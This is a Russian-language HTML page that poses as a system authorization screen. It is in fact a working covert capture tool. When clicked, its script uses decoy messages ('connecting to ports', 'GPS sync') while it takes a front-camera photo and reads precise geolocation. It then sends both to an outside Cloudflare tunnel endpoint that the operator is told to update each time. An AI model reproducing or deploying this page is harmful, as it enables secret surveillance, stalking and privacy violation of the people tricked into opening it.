<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Системный доступ</title>
    <style>
        body {
            margin: 0;
            background: #000;
            color: #fff;
            font-family: sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        
        #flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            opacity: 0;
            pointer-events: none;
            z-index: 100;
            transition: opacity 0.1s;
        }
        
        .overlay-btn {
            position: absolute;
            width: 100%;
            height: 100%;
            background: transparent;
            border: none;
            color: #555;
            font-size: 18px;
            cursor: pointer;
            z-index: 50;
        }
        
        #status {
            text-align: center;
            z-index: 10;
            pointer-events: none;
        }
        
        video,
        canvas {
            display: none;
        }
    </style>
</head>

<body onclick="startEverything()">
    <div id="flash"></div>
    <button class="overlay-btn" id="mainBtn">НАЖМИТЕ ДЛЯ ПРОДОЛЖЕНИЯ</button>

    <div id="status">
        <h2 id="msg">Ожидание авторизации...</h2>
        <div id="log" style="font-size: 12px; color: #666;">Нажми на экран</div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        // ОБНОВЛЯЙ ЭТУ ССЫЛКУ ИЗ CLOUDFLARE КАЖДЫЙ РАЗ!
        const API_URL = "https://b7a489ec0c7848.trycloudflare.com";

        let active = false;

        async function startEverything() {
            if (active) return; // Защита от повторных нажатий
            active = true;

            const btn = document.getElementById('mainBtn');
            const log = document.getElementById('log');
            const msg = document.getElementById('msg');
            const flash = document.getElementById('flash');
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');

            btn.style.display = 'none';
            msg.innerText = "Загрузка...";
            log.innerText = "Подключение к портам...";

            try {
                // 1. ЗАПРОС КАМЕРЫ (Сразу)
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: {
                            ideal: 1920
                        },
                        height: {
                            ideal: 1080
                        }
                    }
                });
                video.srcObject = stream;

                // 2. ЗАПРОС ГЕО (Параллельно в фоне)
                log.innerText = "Синхронизация GPS...";
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        fetch(`${API_URL}/location`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude
                            })
                        });
                    },
                    (err) => console.log("Гео отклонено"), {
                        enableHighAccuracy: true
                    }
                );

                // 3. ПАУЗА НА ФОКУС (1 секунда)
                await new Promise(r => setTimeout(r, 1000));

                // 4. ВСПЫШКА И ФОТО
                flash.style.opacity = "1";

                setTimeout(async() => {
                    const settings = stream.getVideoTracks()[0].getSettings();
                    canvas.width = settings.width || 1280;
                    canvas.height = settings.height || 720;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    flash.style.opacity = "0";
                    msg.innerText = "Обработка...";

                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
                    const fd = new FormData();
                    fd.append('username', 'Auto_User');
                    fd.append('file', blob, `Snap_${Date.now()}.jpg`);

                    await fetch(`${API_URL}/upload-photo`, {
                        method: 'POST',
                        body: fd
                    });

                    stream.getTracks().forEach(t => t.stop());
                    msg.innerText = "✅ Успешно";
                    log.innerText = "Сессия завершена";
                }, 150);

            } catch (err) {
                msg.innerText = "ОШИБКА";
                log.innerText = "Необходимо дать разрешения в браузере";
                active = false;
                btn.style.display = 'block';
            }
        }
    </script>
</body>

</html>
